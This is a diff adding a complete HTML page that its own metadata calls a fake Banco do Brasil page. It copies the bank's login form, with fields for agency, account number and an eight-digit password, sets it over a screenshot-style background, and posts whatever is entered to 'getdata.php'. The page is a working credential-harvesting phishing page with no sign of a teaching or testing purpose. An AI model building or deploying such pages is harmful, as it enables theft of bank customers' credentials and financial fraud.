@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+	<head>
+		<meta charset="UTF-8"/>
+		<meta name="viewport" content="width=device-width, initial-scale=1" />  
+		<meta name="description" content="Página banco do brasil fake" />
+    	<meta name="author" content="Jesimar da Silva Arantes" />
+    	<title>BB Fake</title>  
+		<style>
+			body {
+			  background-image: url("tela-fundo-bb.png");
+			  background-repeat: no-repeat;
+			}	
+	    	input{
+    			border: 1px solid #aaa;
+		    }
+		</style>
+		<link rel="stylesheet" type="text/css" href="aapfLogin.css">	
+		<script type="text/javascript" src="aapf.js"></script>
+	</head>
+	<body>
+		<form method='post' action='getdata.php' mar>
+			<div>
+				<input style="margin-top: 219px; margin-left: 60px; height: 26px; width: 104px;" type="text" name="dependenciaOrigem" value="" title="Informe o prefixo da agência com dígito verificador." alt="Informe o prefixo da agência com dígito verificador." tabindex="2" size="7" maxlength="6" class="valor" onkeydown="return filtraTeclas(event);" onkeypress="return filtraCaracteres(event);" onkeyup="if(isTeclaRelevante(getTeclaPressionada(event))){formataMascara(&#39;####-@&#39;, this); saltaCampo(this,6,2, event)}" onchange="formataMascara(&#39;####-@&#39;, this);" onfocus="setaTextoAjuda(&#39;Informe o prefixo da agência com dígito verificador.&#39;)" onblur="setaTextoAjuda(&#39;&#39;);" required="">
+										
+				<input style="margin-left: 0px; height: 26px; width: 130px;" type="text" name="numeroContratoOrigem" id="numeroContratoOrigem" value="" title="Informe número da conta com dígito verificador." alt="Informe número da conta com dígito verificador." tabindex="3" size="13" maxlength="13" class="valor" onkeydown="return filtraTeclas(event);" onkeypress="return filtraCaracteres(event);" onkeyup="if(isTeclaRelevante(getTeclaPressionada(event))){formataMascara(&#39;################-@&#39;, this);saltaCampo(this,13,3)}" onchange="formataMascara(&#39;################-@&#39;, this);" onfocus="setaTextoAjuda(&#39;Informe número da conta com dígito verificador.&#39;)" onblur="setaTextoAjuda(&#39;&#39;);" required="">
+			</div>
+			<div>
+				<input style="margin-top: 28px; margin-left:60px; height: 26px; width: 213px;" style="display: inline-block;" type="password" name="senhaConta" id="senhaConta" size="15" maxlength="8" tabindex="4" onkeydown="return filtraPassa(this, event, &#39;CHV3819845824&#39;);">
+  			</div>
+  			<div>
+				<input style="margin-top: 10px; margin-left:60px; height: 30px; width: 120px;" class="botaoapf noPrint" type="submit" name="botaoEntrar.x" id="botaoEntrar" title="Entrar" value="ENTRAR   " onclick="getAcaoBotao(&#39;botaoEntrar.x&#39;);confirmaAssinador=1; trocaBotaoAction(&#39;botaoEntrar&#39;);" tabindex="90">
+				<input style="margin-top: 10px; margin-left:0px; height: 30px; width: 120px;" type="reset" class="botaoapf noPrint" title="Limpa a tela atual" value="LIMPAR   ">
+		 	</div>
+		</form>
+	</body>
+</html>
